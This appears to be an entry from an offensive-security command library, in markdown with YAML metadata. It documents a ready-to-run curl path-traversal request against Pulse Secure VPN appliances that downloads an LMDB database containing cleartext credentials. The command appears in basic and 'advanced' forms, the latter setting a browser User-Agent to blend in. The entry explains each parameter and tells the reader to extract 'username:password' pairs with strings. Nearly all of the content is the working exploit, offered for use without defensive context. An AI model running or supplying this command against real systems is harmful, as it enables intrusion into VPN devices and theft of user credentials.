---
data: >-
  curl --path-as-is -k -D-
  https://target/dana-na/../dana/html5acc/guacamole/../../../../../../data/runtime/mtmp/lmdb/dataa/data.mdb?/dana/html5acc/guacamole/#
tags:
  - path-traversal
  - credentials
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:41.695Z'
id: 183552f5-9e8e-4ad2-8af6-3c9554a818fd
verified: false
validated: true
submitted: true
---
# curl-path-traversal-lmdb-credentials

## Command

```bash
curl --path-as-is -k -D- https://target/dana-na/../dana/html5acc/guacamole/../../../../../../data/runtime/mtmp/lmdb/dataa/data.mdb?/dana/html5acc/guacamole/#
```

## Description

Downloads the LMDB file with cleartext credentials via path traversal in Pulse Secure.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `--path-as-is` | Disables path normalization | Yes |
| `-k` | Insecure SSL mode | Yes |
| `-D-` | Header dump | Yes |
| URL | Traversal to LMDB path | Yes |

## Examples

### Basic Usage

```bash
curl --path-as-is -k -D- https://target/dana-na/../dana/html5acc/guacamole/../../../../../../data/runtime/mtmp/lmdb/dataa/data.mdb?/dana/html5acc/guacamole/# > data.mdb
```

### Advanced Usage

```bash
curl --path-as-is -k -D- --header "User-Agent: Mozilla/5.0" https://target/... # Mimic browser
```

## Expected Output

Binary LMDB data; use strings to extract credentials like 'username:password'.

## Related

- [[commands/curl-path-traversal-etc-passwd]]
- [[procedures/Exploit-Path-Traversal-to-Disclose-LMDB-Credentials]]
